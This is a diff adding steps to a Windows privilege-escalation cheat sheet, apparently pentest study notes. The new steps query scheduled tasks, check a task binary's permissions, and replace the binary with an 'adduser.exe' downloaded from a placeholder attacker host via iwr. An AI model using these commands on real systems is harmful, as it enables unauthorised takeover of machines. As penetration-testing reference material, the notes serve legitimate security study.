@@ -291,9 +291,19 @@ Restart-Service vulnerable_service_name
 
 ### Scheduled tasks
 
+List the task:
 ```
 schtasks /query /fo LIST /v
 ```
+Check the ACL:
+```
+icacls C:\Users\hackeduser\somedir\some_scheduled_task.exe
+```
+Replace the binary:
+```
+iwr -uri http://$AttackerIp/adduser.exe -outfile some_scheduled_task.exe
+```
+And wait for the scheduled task to run
 
 ### Exploits
 
